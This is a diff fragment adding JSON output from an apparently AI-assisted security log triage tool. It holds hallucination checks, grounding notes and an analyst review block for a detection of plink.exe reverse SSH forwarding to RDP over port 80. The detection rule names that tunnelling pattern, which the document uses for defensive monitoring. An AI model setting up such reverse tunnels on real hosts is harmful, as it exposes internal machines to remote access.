+      "IP/URL/domain/hash/CVE/email/file exact-string support",
+      "defang preservation",
+      "timestamp source-text check; timeline timestamp <1ms tolerance",
+      "entity (key=value, backtick, host-token) support",
+      "evidence-reference existence and presence",
+      "fabricated rule/agent ID",
+      "Event ID semantics (heuristic: Windows 1102/5145/4624/4625/4732)",
+      "unsupported certainty / attribution",
+      "none-claim vs code-detected risk signals",
+      "timeline timestamp vs cited event",
+      "input prompt-injection scan"
+    ],
+    "disclaimer": "Flags request human review; they are not proof of hallucination. Passing all checks does not prove correctness."
+  },
+  "review": {
+    "status": "Pending Review",
+    "analyst": null,
+    "final_classification": null,
+    "final_priority": null,
+    "correct_findings": [],
+    "incorrect_findings": [],
+    "missing_evidence": [],
+    "hallucinations": [],
+    "notes": "",
+    "reviewed_utc": null,
+    "history": []
+  },
+  "unified": {
+    "engine_version": "unified-intake-0.3.0-candidate",
+    "family": "windows",
+    "pre_ai_notes": [
+      "UNIFIED ROUTING: 4 event(s) assigned to this source family using per-event signatures. Do not infer that unknown or omitted records were analyzed.",
+      "WINDOWS GROUNDED FACT: Sysmon evidence shows 1 observed plink.exe process creation record(s) and 3 TCP connection event(s) sharing the process identity. Command includes -R reverse SSH forwarding, SSH target port 80, RDP port 3389, a password argument (secret withheld). Do not infer repeated process launches from connection events; do not claim the SSH tunnel or RDP session succeeded or activity is authorized.",
+      "WHOLE-FILE PYTHON GROUNDING CONTEXT: windows has evidence-dependent finding type(s): WINDOWS_PLINK_REVERSE_FORWARD. Evidence counts reflect the FULL family subset, not necessarily this AI batch. Do not cite references absent from the current LOG DATA; do not invent events to bridge batches. Use only per-event evidence shown in this call for individual chronology and endpoint attribution. An aggregate is not an individual Zeek flow. This observation is not proof of attacker intent or intrusion.",
+      "DRAFT COMPLETENESS: Use every required ## heading, one confidence level, and at most five representative evidence-linked bullets per section. Never use \"...\", \"continue for all events\", filler rows or omitted promised content. Unknown details must be explicitly called unknown, not guessed."
+    ],
+    "baseline_grounding": {
+      "version": "grounded-detection-1.0",
+      "scope": "observed_input_events_only",
+      "events_inspected": 4,
+      "behavioral_findings": [],
+      "context_observations": [],
+      "final_incident_verdict": "human_review_required",
+      "guarantees": [
+        "No LLM inference",
+        "No proof of attack success",
+        "No SOAR actions"
+      ]
+    },
+    "windows_plink": [
+      {
+        "rule_id": "WINDOWS_PLINK_REVERSE_FORWARD",
+        "evidence_refs": [
+          "E001",
+          "E002",
+          "E003",
+          "E004"
+        ],
+        "process_creation_records": 1,
+        "tcp_connection_records": 3,
+        "ssh_port_80_in_command": true,
+        "rdp_target_in_command": true,
+        "command_line_password_present": true,
+        "assessment": "Suspicious reverse-forwarding command pattern; authorization, SSH success, RDP access and C2 not confirmed."
+      }
+    ],
+    "input_original_sha256": "065cca374de2af6ccf70bd718bcc70ddccca8df852149fb98c039e970b64412c",
+    "whole_family_rules": [
+      "WINDOWS_PLINK_REVERSE_FORWARD"
+    ],
+    "qa": {
+      "needs_human_review": true,
+      "missing_or_truncated_output": false,
+      "flag_count": 6,
+      "review_checks": [
+        "nonexistent_evidence_ref",
+        "timeline_timestamp_mismatch",
+        "unsupported_authorization_status"
+      ],
+      "status": "REVIEW_REQUIRED"
+    }
+  }
+}
